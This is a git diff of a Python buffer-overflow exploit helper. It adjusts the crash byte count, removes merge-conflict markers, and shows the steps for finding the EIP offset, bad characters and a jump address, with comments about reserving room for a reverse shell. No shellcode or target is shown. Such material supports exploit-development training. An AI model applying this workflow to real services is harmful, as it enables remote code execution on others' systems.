@@ -41,21 +41,18 @@ def main():
 	# Sets the number of bytes to crash the application.
 	# Make sure to accommodate space for reverse shell!!
 	# [!] this should be set after running `fuzz` for the remainder of the process
-	obj.num_bytes_crash = 1500
+	obj.num_bytes_crash = 1300
 
 	# Sending pattern to determine offset
 	# [*] the length of the pattern is determined by the `num_bytes_crash` property
 	# 	  which is the number of bytes it took to crash the application plus the number
 	#     of bytes you allocate for your shell code later on. This should require 
-	#     an additional 300-400 bytes. Ex. During my test run it took around 800
+	#     an additional 300-400 bytes
 	obj.send_pattern()
 
-<<<<<<< HEAD
 	# Get offset
 	# pass in the value that overwrote the eip register and get offset
-=======
 	# Get offset 
->>>>>>> ac33bf296928a3784b39cf0c1f301d4633545acf
 	offset = obj.get_offset("30416B30")
 	print(offset)
 
@@ -75,13 +72,10 @@ def main():
 	#     only after sending the initial bad characters payload.
 	obj.add_bad_char("\x0a", "\x0d", "\x25", "\x26", "\x2b", "\x3d")
 
-<<<<<<< HEAD
 	# Send payload with all characters to find bad characters.
 	# [!] bad characters are removed depending on the characters passed
 	#     as arguments to the `add_bad_char` function
-=======
 	# Send payload with all characters to find bad characters
->>>>>>> ac33bf296928a3784b39cf0c1f301d4633545acf
 	obj.send_bad_chars()
 
 	# Set the memory address to jump to after finding valid memory address
